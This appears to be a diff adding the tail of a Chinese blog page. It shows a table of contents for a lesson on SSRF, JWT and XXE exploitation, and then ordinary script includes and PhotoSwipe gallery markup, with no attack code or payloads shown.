+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E4%B8%80%E8%AF%BE-SSRF%E3%80%81JWT%E3%80%81XXE"><span class="toc-number">1.</span> <span class="toc-text">第十一课 SSRF、JWT、XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-SSRF%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">第一节 SSRF的漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-ssrf%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">0x1 ssrf原理解析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFssrf"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">什么是ssrf</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssrf%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">ssrf原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#url%E7%BB%93%E6%9E%84"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">url结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.1.2.</span> <span class="toc-text">0x2 ssrf漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">任意文件读取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">内网资源探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">gopher协议扩展攻击面</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BBredis%E7%9A%846379%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.3.1.</span> <span class="toc-text">攻击redis的6379端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BBMySQL%E7%9A%843306%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.3.2.</span> <span class="toc-text">攻击MySQL的3306端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BBfastcgi%E7%9A%849000%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.2.3.3.</span> <span class="toc-text">攻击fastcgi的9000端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fastcgi%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.2.3.4.</span> <span class="toc-text">fastcgi协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-ssrf%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.</span> <span class="toc-text">0x3 ssrf的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8enclosed-alphanumerics%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E9%99%90%E5%88%B6"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">使用enclosed alphanumerics绕过数字限制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">IP地址进制绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%86%99%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.3.</span> <span class="toc-text">特殊写法绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.1.3.4.</span> <span class="toc-text">302跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.3.5.</span> <span class="toc-text">短网址绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-JWT%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E7%AA%81%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">第二节 JWT的原理以及突破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-%E4%BB%80%E4%B9%88%E6%98%AFjwt"><span class="toc-number">1.2.1.</span> <span class="toc-text">0x4 什么是jwt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">jwt基本概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt%E4%BD%BF%E7%94%A8"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">jwt使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jwt%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">jwt的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A9%BA%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.1.3.1.</span> <span class="toc-text">空加密算法</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%86%E9%92%A5%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.1.3.2.</span> <span class="toc-text">密钥爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%81%E9%92%A5%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.3.3.</span> <span class="toc-text">私钥泄露攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%AC%E9%92%A5%E6%B3%84%E9%9C%B2%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.3.4.</span> <span class="toc-text">公钥泄露攻击</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-XXE%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.3.</span> <span class="toc-text">第三节　XXE文件读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5%E4%BB%80%E4%B9%88%E6%98%AFxxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.1.</span> <span class="toc-text">0x5什么是xxe漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe%E7%9A%84%E6%A6%82%E5%BF%B5"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">xxe的概念</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe%E5%8D%B1%E5%AE%B3"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">xxe危害</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#xxe%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">xxe利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">1.3.1.3.1.</span> <span class="toc-text">有回显的情况</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%83%85%E5%86%B5"><span class="toc-number">1.3.1.3.2.</span> <span class="toc-text">无回显情况</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
